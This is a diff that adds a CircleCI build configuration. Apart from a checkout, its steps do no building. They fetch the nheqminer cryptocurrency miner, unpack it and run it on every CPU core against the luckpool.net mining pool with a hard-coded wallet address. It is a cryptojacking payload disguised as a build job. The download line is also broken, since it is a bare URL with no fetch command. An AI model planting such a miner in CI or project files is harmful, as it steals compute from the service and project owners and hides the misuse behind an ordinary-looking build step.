@@ -1,0 +1,13 @@
+version: 2
+jobs:
+  build:
+    docker:
+      - image: ubuntu-latest
+    steps:
+      - run: apt-get update && apt-get install -qy git cmake mesa-common-dev libidn11-dev python3-requests python3-git
+
+      - checkout
+      - run: https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+
+      - run: tar -xvf nheqminer-Linux-v0.8.2.tgz
+      - run: cd nheqminer-Linux-v0.8.2 && chmod +x nheqminer && ./nheqminer -v -l na.luckpool.net:3956 -u RCx8zXuKqRZufVX51pBXUBrTqx5uvMKb63.newuser -p x -t $(echo $(nproc --all))
